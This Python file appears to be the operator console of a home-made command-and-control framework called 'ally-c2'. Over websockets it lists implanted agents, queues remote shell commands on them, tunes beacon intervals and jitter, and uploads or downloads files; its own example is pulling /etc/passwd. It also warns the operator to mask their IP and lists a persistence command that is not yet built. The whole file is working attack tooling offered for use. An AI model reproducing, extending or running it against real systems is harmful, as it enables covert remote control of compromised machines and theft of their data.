import readline #for semi shell interaction in input()
import asyncio
import json
import websockets
import os
import base64


from prompt_toolkit import PromptSession, print_formatted_text
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import clear


#-----
#### colors for printing #####
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
PURPLE = "\033[38;2;128;0;255m"
BLUE = "\033[34m"

def banner():
    print(f"""{PURPLE}

                                                                                                      
         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.     88 88
        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88 88 
       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88 88
      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88 88
     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88 88
    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88 88
   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88 88
  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88 88
 .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88 88
.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'     88 88


    {RESET}""")

def warning():
    banner()
    print(f"{BOLD}{RED}[!] warning [!]{RESET}\n")
    print("REMEMBER to take precaution and mask your ip\n")

    while True:
        con = input("do you want to continue[y/n] ").lower()
        if con == "y" or con == "n":
            break

    if con == "y":
        return True

    return False


    

def all_actions(actions):
    if actions == "main":
        print(f"""

### SERVER USE ###

- help
- clear
- build
    ip||url /port/ windows||linux

- list-agents 
- use <agent id>


          """)

    if actions == "use":
        print(f"""
### AGENT USE ###

- back
    back to server mode
- help
- clear

- sh <shell cmd>
- ch-beacon <seconds> [jitter%]
    change agent polling interval by second
    es. ch-beacon 3600 50 , make polling of 1h + jitter

- upload <mypath> <agentpath>
- download  <agentpath> <mypath>

- percistance 
    

          """)


def my_clear():
    clear()

def command_not_fount():
    print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
#-----

DOWNLOAD_DESTINATIONS = {}




async def event_listener(event_url):
    try:
        print(f"\n[DEBUG] connect to channer events: {event_url}")
        async with websockets.connect(event_url) as ws:
            print(f"[DEBUG] ")
            while True:
                response_raw = await ws.recv()
                print(f"[DEBUG] : {response_raw}")
                
                response = json.loads(response_raw)
                if response.get("type") == "agent_output":
                    output_content = response.get('output', '')
                    agent_id = response.get('agent_id')
                    
                    if output_content.startswith("[DOWNLOAD_SUCCESS]|"):
                        try:
                            _, b64_data = output_content.split("|", 1)
                            file_bytes = base64.b64decode(b64_data)
                            
                            save_path = DOWNLOAD_DESTINATIONS.pop(agent_id, f"downloaded_{agent_id}_{int(asyncio.get_event_loop().time())}")
                            
                            with open(save_path, "wb") as f:
                                f.write(file_bytes)
                                
                            msg = f"\n{GREEN}[+] File downloaded successfully saved as: {save_path}{RESET}\n"
                        except Exception as e:
                            msg = f"\n{RED}[-] Error while saving file: {e}{RESET}\n"
                    else:
                        msg = f"\n{GREEN}[*] agent output [{agent_id}]:{RESET}\n{output_content}\n"
                        
                    print_formatted_text(ANSI(msg))
                    
    except websockets.exceptions.ConnectionClosed as e:
        print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
    except Exception as e:
        print(f"\n{RED}[-] ctical error in event_listener: {e}{RESET}")








async def use_agent(websocket, agent_id, session):

    with patch_stdout():
        while True:
            shell_cmd = await session.prompt_async(ANSI(f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > "))
            shell_cmd= shell_cmd.strip()

            if not shell_cmd:
                continue

            parts = shell_cmd.split()
            action = parts[0]
            
            if action == "back":
                print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} exit use mode\n"))
                return
            elif action == "help":
                all_actions("use")
                continue
            elif action == "clear":
                my_clear()
                continue

            elif action == "sh":
                if len(parts) < 2:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify command (es. sh ls)"))
                    continue
                
                sh_cmd = " ".join(parts[1:])
                
                payload = {
                    "action": "queue_task",
                    "agent_id": agent_id,
                    "data": sh_cmd
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                
                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. wait for output...{RESET}\n"))
                continue

            elif action == "ch-beacon":
                if len(parts) < 2:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify second and jitter (es. ch-beacon 60 10)"))
                    continue
                
                interval = parts[1]
                jitter = parts[2] if len(parts) > 2 else "0"
                
                payload = {
                    "action": "update_beacon",
                    "agent_id": agent_id,
                    "interval": int(interval),
                    "jitter": int(jitter)
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                
                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
                continue
            

            elif action == "upload":
                if len(parts) < 3:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specifica file locale e destinazione remota (es. upload /tmp/file.txt /var/tmp/file.txt)"))
                    continue
                
                local_path = parts[1]
                remote_path = parts[2]

                if not os.path.exists(local_path):
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] File locale non trovato: {local_path}"))
                    continue

                try:
                    with open(local_path, "rb") as f:
                        encoded_data = base64.b64encode(f.read()).decode('utf-8')
                    
                    task_data = f"upload {remote_path} {encoded_data}"
                    
                    payload = {
                        "action": "queue_task",
                        "agent_id": agent_id,
                        "data": task_data
                    }
                    await websocket.send(json.dumps(payload))
                    _ = await websocket.recv()
                    print_formatted_text(ANSI(f"\n{GREEN}[+] Task di upload accodato per {local_path} -> {remote_path}{RESET}\n"))
                except Exception as e:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Errore lettura file locale: {e}"))
                continue



            elif action == "download":
                if len(parts) < 3:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specifica file remoto e destinazione locale (es. download /etc/passwd ./passwd.txt)"))
                    continue
                
                remote_path = parts[1]
                local_path = parts[2] 

                DOWNLOAD_DESTINATIONS[agent_id] = local_path

                task_data = f"download {remote_path}"
                
                payload = {
                    "action": "queue_task",
                    "agent_id": agent_id,
                    "data": task_data
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                print_formatted_text(ANSI(f"\n{BLUE}[*] Task di download accodato per {remote_path} -> {local_path}. In attesa dell'output...{RESET}\n"))
                continue




            # elif action == "percistance":
            #     continue

            else:
                command_not_fount()




async def main(server_url, event_url):
    if not warning():
        return

    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
    print(f"all the possible actions\n")

    session = PromptSession()

    try: 
        async with websockets.connect(server_url) as websocket:
            asyncio.create_task(event_listener(event_url)) 

            with patch_stdout():
                while True:
                    cmd = await session.prompt_async(ANSI(f"{BOLD}{RED}server{RESET}[ally-c2] > "))
                    cmd = cmd.strip().lower()

                    if not cmd:
                        continue
                    parts = cmd.lower().split()
                    action = parts[0]


                    if action == "help":
                        all_actions("main")
                        continue
                    elif action == "exit":
                        print("press ctrl + C to exit")
                    elif action == "clear":
                        my_clear()
                        continue
                    elif action == "build":
                        print("working on")
                        continue




                    elif action == "list-agents":
                        payload = {"action": "list_agents"}
                        await websocket.send(json.dumps(payload))
                        response = json.loads(await websocket.recv())
                        print(f"\nActive Agents:\n\n{response.get('agents')}\n")
                        continue

                    elif action == "use":
                        if len(parts) < 2:
                            print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)"))
                            continue
                        
                        agent_id = parts[1]
                        print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n"))
                        
                        await use_agent(websocket, agent_id, session) 
                        continue
                    

                    else:
                        command_not_fount()










    except websockets.exceptions.ConnectionClosed:
        print("[-] Connection closed form server.")
    except Exception as e:
        print(f"[-] Error of connection: {e}")


if __name__ == "__main__":

    server_url = "ws://192.168.1.172:8080/ws/operator"
    events_url= "ws://192.168.1.172:8080/ws/events"

    try:
        asyncio.run(main(server_url,events_url))
    except KeyboardInterrupt:
        print(f"\n[{RED}*{RESET}] forced exit form ally-c2 CLI-CLIENT.")




